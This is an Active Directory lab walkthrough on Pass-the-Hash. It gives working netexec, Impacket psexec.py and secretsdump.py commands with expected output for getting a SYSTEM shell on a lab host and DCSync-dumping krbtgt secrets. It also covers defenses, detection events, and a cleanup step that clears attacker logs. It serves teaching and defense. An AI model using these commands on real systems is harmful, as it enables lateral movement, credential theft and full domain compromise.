# 05 — Pass-the-Hash (T1550.002)

NTLM authentication never sends the plaintext password to the server — it proves knowledge of the password's NT hash. That means the NT hash *is* the credential: an attacker who recovers a hash (from the SAM dump in attack 04, from `lsass`, or from secretsdump) can authenticate as that account without ever knowing or cracking the password. This walkthrough takes the `Administrator` and `sql_admin` NT hashes obtained earlier and uses them with Impacket's `psexec.py` and `netexec` to move laterally onto `castelblack`, landing a SYSTEM shell.

**MITRE ATT&CK Technique**: [T1550.002 — Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)

## Prerequisites
- An NT hash for an account that holds local admin (or domain admin) on the target. This lab reuses the SAM dump from attack 04 (`castelblack` local `Administrator` / `sql_admin`) and, for the domain path, the `tywin.lannister` hash recovered via the ACL chain in attack 01.
- Network access to SMB (445) on the target `castelblack` (192.168.56.11).
- NTLM authentication permitted to the target (true in this lab).

## Tools
- Impacket v0.12.0 (`psexec.py`, `secretsdump.py`) — run on the Linux attacker (192.168.56.1).
- `netexec` (NetExec, the maintained CrackMapExec successor) — run on the Linux attacker.

## Step-by-step Commands

### Step 1 — (Linux attacker, 192.168.56.1) Validate the hash with netexec (local-auth)
`--local-auth` authenticates against the host's local SAM, not the domain. `(Pwn3d!)` confirms local admin.
```bash
# NT hash format is LM:NT; the empty LM portion is the standard aad3b... blank.
netexec smb 192.168.56.11 -u Administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' \
  --local-auth
```

### Step 2 — (Linux attacker, 192.168.56.1) Validate a domain account hash against the target
Drop `--local-auth` to authenticate as a domain principal. Use the `sql_admin` (or domain `tywin.lannister`) hash.
```bash
netexec smb 192.168.56.11 -u sql_admin \
  -H '64f12cddaa88057e06a81b54e73b949b' -d {{DOMAIN}}
# {{DOMAIN}} = sevenkingdoms.local  (NT-only hash is accepted; LM blank is implied)
```

![Step 2](../screenshots/attack-5-step-2.png)

### Step 3 — (Linux attacker, 192.168.56.1) Get a SYSTEM shell with psexec.py over the hash
`-hashes LM:NT` passes the hash; psexec uploads a service binary and returns an interactive shell running as `NT AUTHORITY\SYSTEM`.
```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  Administrator@192.168.56.11
```

![Step 3](../screenshots/attack-5-step-3.png)

### Step 4 — (Linux attacker, 192.168.56.1) Confirm the SYSTEM context inside the shell
```powershell
whoami
hostname
```

### Step 5 — (Linux attacker, 192.168.56.1) Optional: dump domain secrets if a DA hash was used
With the domain-admin (`tywin.lannister`) hash, perform a DCSync against the forest root DC `kingslanding`.
```bash
secretsdump.py -hashes :<tywin_NT_hash> {{DOMAIN}}/tywin.lannister@192.168.56.10 -just-dc-user krbtgt
# {{DOMAIN}} = sevenkingdoms.local, DC = kingslanding (192.168.56.10)
```

![Step 5](../screenshots/attack-5-step-5.png)

## Expected Output

netexec local-auth validation (Step 1):
```text
SMB  192.168.56.11  445  CASTELBLACK  [*] Windows Server 2022 x64 (name:CASTELBLACK) (domain:CASTELBLACK) (signing:False) (SMBv1:True)
SMB  192.168.56.11  445  CASTELBLACK  [+] CASTELBLACK\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)
```

netexec domain validation (Step 2):
```text
SMB  192.168.56.11  445  CASTELBLACK  [*] Windows Server 2022 x64 (name:CASTELBLACK) (domain:sevenkingdoms.local) (signing:False) (SMBv1:True)
SMB  192.168.56.11  445  CASTELBLACK  [+] sevenkingdoms.local\sql_admin:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
```

psexec.py SYSTEM shell (Step 3 + 4):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.56.11.....
[*] Found writable share ADMIN$
[*] Uploading file kXmPqRtZ.exe
[*] Opening SVCManager on 192.168.56.11.....
[*] Creating service nWvL on 192.168.56.11.....
[*] Starting service nWvL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
castelblack
```

secretsdump DCSync (Step 5):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:7c3e9a1b5d8f2046e1c4a8b6d2f0c7e539a1c8f4b6e2d9075c3a8f1e4b6d290c5
krbtgt:aes128-cts-hmac-sha1-96:9f3e7c1a5b8d2f4e6c0a9b3d7f1e5c8a
[*] Cleaning up...
```

## Cleanup Steps
- Exit the psexec shell cleanly (`exit`) — Impacket removes the uploaded service binary (`kXmPqRtZ.exe`) and deletes the temporary service (`nWvL`) on disconnect. Verify the service is gone: `netexec smb 192.168.56.11 -u Administrator -H <hash> --local-auth -x "sc query nWvL"` should return "service does not exist".
- On the Linux attacker: clear shell history and remove any saved hashes — `rm -f ~/.local/share/netexec/logs/* hashes.txt`.
- No passwords were changed on `castelblack` or in the domain. If you performed the `krbtgt` DCSync, do **not** reset the `krbtgt` password — that would invalidate all tickets and disrupt the lab; treat the dump as read-only proof.
- Recovered hashes were used in-memory; ensure they are not committed to the repo.

## What This Tells You About AD
Pass-the-Hash exposes the foundational weakness of NTLM: the hash is a password-equivalent secret that is replayable indefinitely until the password changes. No cracking, no plaintext, no lockout — possession of the hash is sufficient to authenticate. The compounding problem is credential reuse: a single local `Administrator` hash shared across machines (a common imaging artifact) turns one compromised host into network-wide lateral movement, and a recovered Domain Admin hash enables DCSync and full domain compromise. Defenses are layered: deploy LAPS so every machine has a unique local admin password (killing local-hash reuse), enforce the "Protected Users" group and Credential Guard to keep hashes out of `lsass`, restrict NTLM and prefer Kerberos, segment the network so SMB lateral movement is constrained, and tier administrative accounts so a workstation compromise can never expose a Domain Admin credential. That a SAM-dumped hash from `castelblack` immediately yields a SYSTEM shell is the textbook demonstration of why hashes must be protected as carefully as passwords.

## Detection Reference
See [../detection/kql-queries.md#5-pass-the-hash](../detection/kql-queries.md#5-pass-the-hash) for the lateral-movement signatures (Event ID 4624 Type 3 NTLM logons from unusual sources, 7045 service installs from `psexec`, `ADMIN$` writes of randomly-named binaries, and DRSUAPI/DCSync replication requests from non-DC accounts — Event ID 4662 with the `DS-Replication-Get-Changes` GUID).

---
Last updated: 2026-05-17

MITRE references:
- [T1550.002 — Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [TA0008 — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
